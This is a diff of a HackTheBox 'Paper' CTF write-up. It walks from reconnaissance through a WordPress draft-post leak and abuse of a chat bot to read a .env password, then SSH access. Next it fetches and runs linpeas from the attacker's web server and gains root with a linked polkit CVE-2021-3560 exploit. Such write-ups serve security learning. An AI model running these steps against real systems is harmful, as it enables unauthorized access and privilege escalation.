@@ -1,4 +1,5 @@
-# nmap scan
+## Using nmap, scan this machine. What ports are open?
+
 ```bash
 ┌──(defalt@kali)-[~/Documents/htb/paper]
 └─$ nmap -sC -sV -o nmap 10.10.11.143 
@@ -34,11 +35,14 @@ PORT    STATE SERVICE  VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 56.97 seconds
-```         
-# website port 80
+```
+Nmap result shows that SSH , SSL and Apache are available on their default ports. Let's take look at webpage. Maybe we can find something.
 
-# looking for x-backend
+## Website port 80
+![](website.png)
 
+## Looking for X-backend
+I didn't find anything useful on website.Let's try to find backend server. For that we using curl with location flag (-L) for see which route our website take.
 ```bash
 ┌──(defalt@kali)-[~/Documents/htb/paper]
 └─$ curl -I  10.10.11.143 
@@ -51,22 +55,59 @@ ETag: "30c0b-5c5c7fdeec240"
 Accept-Ranges: bytes
 Content-Length: 199691
 Content-Type: text/html; charset=UTF-8
-
 ```
-# blunder tiffin paper company
-analyze with wappalyze
+Looks like we got our self a winner. We found our backend server **office.paper**. Let's add it **/etc/hosts** file.
 
-wpscan 
+## Blunder Tiffin Paper Company
+When we got to **office.paper** we can see this website.
+
+![](office-paper.png)
+
+When we scroll down a bit we can see a comment(hint) on one of post.
+
+![](comment.png)
+
+## Analyze with Wappalyzer
+![](wappa.jpg)
+
+Wappalyzer reveals website running on wordpress 5.2.3. Let's try to run wpscan.
+
 ```bash
 +] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
  | Found By: Rss Generator (Passive Detection)
  |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
  |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 ```
+Wpscan results shows this version is vurnerable. So let's go to google and search about this after while I found this site.
+
 https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 
-# login to user dwight
+So it has a vulnerability could allow an unauthenticated user to view private or draft posts due to an issue within WP_Query. Let's try it.
 
+![](vurnablilty%20wordpress.png)
+
+After reading a draft we can see secret registeration url and another server called **chat.office.paper**. Let's add it to **/etc/hosts/** and click the link. When we click the link we can see new user registeration site.
+
+![](register.png)
+
+After register and log with your new account. If you surf the webpage You will find a general Chat .When you scroll up You will find that **DwightKSchrute** is the admin and he added a Bot named **Recyclops** .You will also find out that You cannot Type in the General Chat But you can Direct Message the **Bot Recyclops**. When I Type **Recyclops Help** it gives me set of instructions.
+
+![](bot.png)
+
+The Instructions state that we can ask the Recyclops Bot A file , to List files and many more. Which was a Interesting! , So I tried to get User.txt Using The Recyclops Bot But was Unsuccessful Because It Says Access denied. 
+
+![](access%20denied.png)
+
+After messing around I reach the jackpot. When you got **hubot dir** you can see some of interesting files.
+
+![](hubot.png)
+
+When you try to look into **.env** file. you can get the password to **dwight** account.
+
+![](password.png)
+
+## Login to user **dwight**
+When we log into **dwight** acc we can get a user flag.
 ```bash
 ┌──(defalt@kali)-[~/Documents/htb/paper]
 └─$ sudo ssh dwight@10.10.11.143
@@ -107,12 +148,10 @@ drwxr-xr-x   4 dwight dwight   32 Jul  3  2021 sales
 drwx------   2 dwight dwight    6 Sep 16  2021 .ssh
 -r--------   1 dwight dwight   33 Apr  9 22:47 user.txt
 drwxr-xr-x   2 dwight dwight   24 Sep 16  2021 .vim
-
-
 ```
-linpeas
+## Let's run linpeas to see what is our machine upto
 
-python3 -m http.server / ip addr show tun0
+First start a web server on our machine. **python3 -m http.server** and download it to victims machine.
 
 ```bash
 [dwight@paper ~]$ wget 10.10.14.53:8000/linpeas.sh
@@ -128,8 +167,19 @@ linpeas.sh.1            100%[=============================>] 131.02K   266KB/s  
 
 [dwight@paper ~]$ bash linpeas.sh
 ````
-# polkit vurnealble
+* Linpeas results :
+
+![](polkit%20linpeas.png)
+
+Our linpeas result shows this machine vureable to polkit exploit(CVE-2021-3560).
+
+## Polkit exploit
+
+I'm using this script to exploit our machine.
+
 https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py
+
+After few tries I got the root access. GG!
 
 ```bash
 [dwight@paper ~]$ python3 poc.py
@@ -157,5 +207,5 @@ bash: no job control in this shell
 [root@paper dwight]#
 [root@paper ~]# whoami
 root
-
 ```
+Thx for reading !! Have a nice day.
